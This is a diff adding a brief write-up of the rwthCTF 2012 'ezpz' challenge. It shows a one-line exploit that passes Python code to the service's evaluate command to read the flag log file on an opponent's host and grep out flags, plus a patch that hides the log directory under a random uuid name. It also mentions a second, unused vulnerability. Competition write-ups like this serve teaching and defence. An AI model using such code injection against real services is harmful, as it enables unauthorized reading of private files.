@@ -1,0 +1,23 @@
+--- 
+title: rwthctf2012 -- ezpz
+author: alter
+categories: 
+- writeup
+---
+
+<h1>rwthCTF 2012 - ezpz</h1>
+Flags was stored in <b>log/ezlog</b> and we could got them via <b>ezclient.py</b><br/>
+
+<h3>Exploit:</h3>
+<pre><code>
+./ezclient.py 10.12.X.10 evaluate 'fl = open("/home/ezpz/log/ezlog","r"); print fl.read(); fl.close()' | egrep -o -e "\w{16}"
+</code></pre>
+
+<h3>Patch:</h3
+<pre><code>
+mv log `uuid`
+</code></pre>
+and change path in ezpz.py from log/ to generated uuid<br/>
+<br/>
+Also there was another vulnerability, when you could get whois information, register and make admin_check<br/>
+but we didn't use it because I found it very later</br>
